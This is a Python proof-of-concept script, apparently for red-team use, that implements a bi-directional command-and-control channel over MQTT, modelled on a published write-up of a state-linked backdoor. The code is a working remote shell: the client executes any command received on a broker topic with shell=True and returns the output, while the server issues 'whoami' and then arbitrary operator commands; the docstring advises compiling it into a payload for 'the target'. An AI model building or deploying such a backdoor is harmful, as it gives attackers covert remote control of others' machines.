"""
This is a proof-of-concept script for using MQTT as a bi-directional C2. 
Based on: https://www.welivesecurity.com/2023/03/02/mqsttang-mustang-panda-latest-backdoor-treads-new-ground-qt-mqtt/

[Requirements]
- paho-mqtt
- (optional) pyinstaller

[Use]
The script works as both the client and server and only requires a broker to connect to. 
You should compile this with PyInstaller then use the compiled payload to avoid having to install dependencies on the target.

To launch the client
> mqttc2.py -b {{ broker_fqdn }} -p {{ broker_port }} -u {{ username }} -c {{ password }} -m client

To launch the server
> mqttc2.py -b {{ broker_fqdn }} -p {{ broker_port }} -u {{ username }} -c {{ password }} -m server

On initial connection, the server will run `whoami` on the client. Afterwards, you can issue arbitrary commands from the server terminal.

[Notes]
- This script assumes a username and password are required. If they are not, remove the `client.username_pw_set` line from the code.
- This script assumes a broker certificate is located in the local directory and named `ca.crt`. If no certificate is required, remove the `client.tls_set` line from th
"""

import paho.mqtt.client as mqtt
import yaml
import pathlib
import subprocess
import sys
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-b","--host", type=str)
parser.add_argument("-p","--port", type=int)
parser.add_argument("-u","--user", type=str)
parser.add_argument("-c","--password", type=str)
parser.add_argument("-m","--mode", type=str)
args = parser.parse_args()


def srv_on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))
    client.subscribe("output")
    client.publish("cmds", payload="whoami")

def srv_on_message(client, userdata, msg):
    print(">>>\n%s" % msg.payload.decode())
    cmd = input("cmd> ")
    client.publish("cmds", payload=cmd)

def client_on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))
    client.subscribe("cmds")

def client_on_message(client, userdata, msg):
    print("command: "+" "+str(msg.payload))
    cmdoutput = subprocess.Popen(msg.payload, shell=True, stdout=subprocess.PIPE).stdout.read()
    client.publish("output", payload=cmdoutput)

if args.mode == "server": 
    client = mqtt.Client("server")
    client.on_connect = srv_on_connect
    client.on_message = srv_on_message
elif args.mode == "client":
    client = mqtt.Client("client")
    client.on_connect = client_on_connect
    client.on_message = client_on_message
else:
    print("mode error")

client.tls_set(ca_certs="./ca.crt")
client.username_pw_set(args.user, password=args.password)
client.connect(args.host, port=args.port)

client.loop_forever()
